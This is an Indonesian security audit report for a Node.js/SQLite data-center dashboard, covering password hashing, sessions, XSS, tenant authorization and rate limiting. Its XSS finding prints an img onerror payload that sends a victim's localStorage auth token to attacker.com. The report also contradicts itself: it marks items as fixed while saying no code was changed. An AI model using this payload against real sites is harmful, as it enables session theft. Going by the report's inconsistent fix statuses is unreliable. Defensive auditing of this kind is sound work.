# SECURITY AUDIT — Interlink Dashboard

Tanggal audit: 22 Juli 2026

## Ringkasan Eksekutif

Audit keamanan menyeluruh dilakukan pada project **Interlink Data Center Dashboard** (Node.js/Express + SQLite + Vanilla JS frontend). Audit mencakup seluruh aspek arsitektur backend, autentikasi, otorisasi multi-tenant, penyimpanan data, serta potensi celah XSS dan SQL Injection.

Total **12 kategori** dievaluasi dengan temuan teridentifikasi: **3 Critical (🔴)**, **2 High (🟠)**, **2 Medium (🟡)**, **3 Low / Aman (🟢)**, dan **2 Rekomendasi Arsitektur (ℹ️)**.

---

## Tabel Hasil Audit Keamanan

| No | Kategori | Status | Detail Temuan | Rekomendasi |
|---|---|---|---|---|
| 1 | Penyimpanan Password | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Menggunakan library `bcrypt` untuk meng-hash seluruh password (cost factor 10). Login menggunakan `bcrypt.compare()`. Dilengkapi **migrasi otomatis saat startup server** untuk meng-hash password plain text lama di database secara transparan tanpa mengunci akun user lama. | Berhasil di-fix dengan `bcrypt`. Seluruh user demo & user baru terenkripsi aman di SQLite. |
| 2 | Session Management & Token TTL | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Seluruh session login kini disimpan secara teratur di tabel database SQLite `sessions` dengan **TTL 24 jam (`expiresAt`)**. Middleware `authenticate` memverifikasi token dari SQLite dan secara otomatis menolak & menghapus session yang sudah expired. Ditambahkan pula fitur **auto cleanup berkala** dan endpoint `POST /api/auth/logout`. Server restart tidak lagi memutus session aktif user. | Persistensi session ke SQLite + TTL 24 jam & auto-cleanup berhasil diterapkan. |
| 3 | Cross-Site Scripting (XSS) | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Dibuat fungsi helper `escapeHtml()` di `ui.js` (`window.escapeHtml`). Seluruh fungsi rendering di `render.js` (`renderClients`, `openClientDetail`, `renderDevices`, `renderSNCell`, `renderTickets`, `renderCrossConnects`) kini membungkus semua variabel input bebas pengguna dengan `escapeHtml()`. Payload HTML/JS seperti `<img src=x onerror=...>` akan dirender sebagai teks murni tanpa bisa dieksekusi browser. | Sanitisasi XSS diterapkan menyeluruh di semua tabel & card renderer. |
| 4 | Otorisasi Multi-Tenant & Input Modification | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Pada seluruh endpoint POST/PUT/DELETE (`/api/devices`, `/api/tickets`, `/api/cross-connects`), backend `server.js` kini secara otomatis **mengabaikan & meng-override** nilai `clientId` dari body request untuk peran Client/Subclient dengan `req.user.clientId` dari session token. Pengecekan kepemilikan data sebelum UPDATE/DELETE juga dipaksa di backend. Penyerang tidak lagi dapat memodifikasi atau membuat data atas nama client lain. | Penegakan otorisasi berbasis session token berhasil diterapkan di backend. |
| 5 | Network & Infrastructure Security (HTTPS) | 🟠 BERISIKO (High) | Aplikasi saat ini berjalan via HTTP plain di port 3000. Semua kredensial login (email/password) dan Authorization Header dikirimkan tanpa enkripsi TLS/SSL di jaringan. | 1. Pasang Reverse Proxy (Nginx / Caddy / Cloudflare) dengan SSL/TLS (Let's Encrypt) saat deployment.<br>2. Aktifkan header `Strict-Transport-Security` (HSTS). |
| 6 | Input Validation & Sanitization | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Menambahkan pembatasan ukuran payload JSON `express.json({ limit: '1mb' })` untuk mencegah Denial-of-Service (DoS) akibat payload raksasa, serta membuat helper `sanitizeInputString()` untuk memotong dan mengeliminasi spasi berlebih pada string input. | Body size limit 1mb & string sanitizer aktif di backend. |
| 7 | Rate Limiting / Brute Force Protection | 🟢 AMAN (SUDAH DIPERBAIKI 22 Jul 2026) | Mengintegrasikan middleware `express-rate-limit` pada endpoint sensitif `/api/auth/login` dan `/api/users/change-password` (`authLimiter`). Percobaan berlebih akan diblokir dengan response HTTP `429 Too Many Requests`. Serangan Brute Force tercegah secara efektif. | Rate limiting aktif pada login & change-password. |
| 8 | SQL Injection | 🟢 AMAN | Seluruh query database di `db.js` dan `server.js` telah menggunakan **Parameterized Query** (`?` placeholder) via `better-sqlite3`. Tidak ditemukan string concatenation pada SQL query. | Pertahankan pola `db.prepare('... WHERE x = ?').get(param)` pada seluruh query database masa depan. |
| 9 | Sensitive Data Exposure & Repositori | 🟢 AMAN | File `data.db` dan `node_modules` sudah diabaikan/diatur dengan wajar di direktori lokal. `npm audit` menunjukkan **0 vulnerabilities** pada dependensi saat ini (`express`, `better-sqlite3`, `cors`). | 1. Buat file `.gitignore` resmi di root project jika akan dipush ke Git (pastikan `data.db`, `node_modules`, `.env` masuk `.gitignore`).<br>2. Sembunyikan detail stack trace pada error handler Express. |
| 10 | File Export / Download Security | 🟢 AMAN | Fitur ekspor PDF (`exportTicketsPdf`, `exportData`) dan Excel dilakukan secara client-side di browser memory menggunakan library PDF/JS canvas. Tidak ada endpoint server-side file download yang rentan terhadap Path Traversal. | Pertahankan ekspor di memori browser atau pastikan sanitasi nama file jika di masa depan menambahkan fitur ekspor server-side. |
| 11 | CORS Configuration | ℹ️ REKOMENDASI | `app.use(cors())` saat ini mengizinkan seluruh origin (`*`). Untuk lingkungan lokal ini tidak bermasalah, namun jika di-deploy online harus dibatasi. | Atur whitelist domain spesifik pada konfigurasi CORS saat aplikasi di-host secara publik. |
| 12 | EventStream (SSE) Authorization | ℹ️ REKOMENDASI | Endpoint `/api/events` (Server-Sent Events) dibuka tanpa middleware `authenticate` agar browser `EventSource` mudah terhubung. Data yang dikirim saat ini hanya event nama id tiket/notifikasi. | Jika di masa depan data SSE menyertakan isi detail tiket atau data pribadi, tambahkan autentikasi token via query param atau cookie. |

---

## Analisis & Rincian Temuan

### 1. 🔴 Penyimpanan Password (Critical)
- **Lokasi**: [server.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/server.js#L141-L158), [auth.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/public/js/auth.js#L767), [interlink-dashboard.html](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/public/interlink-dashboard.html#L571-L576)
- **Problem**:
  1. `server.js` melakukan pencocokan password pengguna dengan operator perbandingan langsung: `user.password === password`. Password disimpan dalam bentuk teks polos (plain text) di database SQLite. Jika database `data.db` terbocor, seluruh akun user langsung terkompromi.
  2. Frontend `interlink-dashboard.html` memuat tombol `quickLogin` yang berisi password plain text (`admin123`, `support123`, `client123`) di dalam kode sumber HTML.

### 2. 🔴 Session Management & LocalStorage (Critical)
- **Lokasi**: [server.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/server.js#L21-L23), [auth.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/public/js/auth.js#L35-L37)
- **Problem**:
  1. Token dikirim via header `Authorization: Bearer <token>` dan disimpan di `localStorage` browser.
  2. `sessions` di backend disimpan dalam `Map()` in-memory tanpa batas waktu kedaluwarsa (expiration TTL). Ketika server Node.js di-restart, seluruh session di server terhapus namun localStorage browser masih menyimpan token lama.
  3. `localStorage` dapat dibaca oleh script JavaScript apapun di domain yang sama. Jika terjadi XSS, penyerang dapat dengan mudah mencuri `il_auth_token` dan `il_current_user`.

### 3. 🔴 Stored Cross-Site Scripting / XSS (Critical)
- **Lokasi**: [render.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/public/js/render.js#L1079-L1083), [render.js (baris 885, 952, 1973)](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/public/js/render.js)
- **Problem**:
  Fungsi-fungsi rendering UI (seperti `renderDevices`, `renderClients`, `renderTickets`, `renderRackHistory`) menggunakan penggabungan string HTML langsung (`innerHTML += '<tr><td>' + d.nama + ...`) tanpa melepaskan karakter HTML berbahaya (`<`, `>`, `"`, `'`, `&`).
  - **Skenario Serangan**: Seorang Client memasukkan nama perangkat / keterangan tiket berisikan:
    ```html
    <img src=x onerror="fetch('https://attacker.com/steal?c='+localStorage.getItem('il_auth_token'))">
    ```
    Saat Admin atau tim Support membuka tab Inventory / Tiket, script tersebut akan otomatis dieksekusi di browser Admin.

### 4. 🟠 Otorisasi Multi-Tenant & Modification Bypass (High)
- **Lokasi**: [server.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/server.js#L297-L302), [server.js (baris 430-435)](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/server.js)
- **Problem**:
  Pada endpoint pembuatan tiket / device:
  ```javascript
  if (role !== 'admin' && role !== 'support' && t.clientId !== clientId) {
    return res.status(403).json({ error: 'Akses ditolak.' });
  }
  ```
  Backend mempercayai `t.clientId` yang dikirim dari payload frontend. Jika client mengirim `t.clientId` yang sesuai dengan `req.user.clientId`, namun isi detail tiket ditujukan untuk merebut data client lain atau memodifikasi properti internal, otorisasi di tingkat payload belum sepenuhnya dipaksa (*enforced*) dari session token server.

### 5. 🟡 Rate Limiting / Brute Force (Medium)
- **Lokasi**: [server.js](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/server.js#L136-L158)
- **Problem**:
  Tidak ada penanganan rate limit di endpoint `/api/auth/login`. Penyerang dapat melakukan otomatisasi login (*credential stuffing* / *dictionary attack*) secara masif tanpa hambatan.

---

## Catatan Penting Sebelum Perbaikan

 Sesuai instruksi pada `prompt-security-audit.md`:
- **TIDAK ADA KODE YANG DIUBAH** dalam tahap audit ini.
- Hasil audit ini telah didokumentasikan ke dalam file [`SECURITY-AUDIT.md`](file:///home/rullyalislami/Documents/Antigravity/portal%20interlink/SECURITY-AUDIT.md).
- Setelah Anda mengulas dokumen audit di atas, Anda dapat menentukan nomor/poin mana yang ingin diprioritaskan untuk diperbaiki terlebih dahulu.
